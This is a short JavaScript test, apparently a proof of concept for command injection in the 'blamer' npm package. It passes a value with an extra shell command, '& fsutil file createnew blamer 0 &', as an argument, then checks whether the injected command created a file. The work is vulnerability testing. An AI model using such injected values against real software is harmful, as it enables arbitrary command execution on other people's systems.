// test("Command Injection in blamer", async () => {
//   expect.assertions(2);
  const Root = require("blamer");
  const fs = require("fs");
  const path = "./blamer";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  console.log("{ " + file_exist + ", " + false + " }");
  let attack_command = "& fsutil file createnew blamer 0 &";
  root = new Root("git", attack_command);
  try {
    await root.blameByFile("./");
  } catch (err) {
  } finally {
    file_exist = fs.existsSync(path);
    console.log("{ " + file_exist + ", " + true + " }");
    fs.unlink(path, function (err) {});
  }
// });
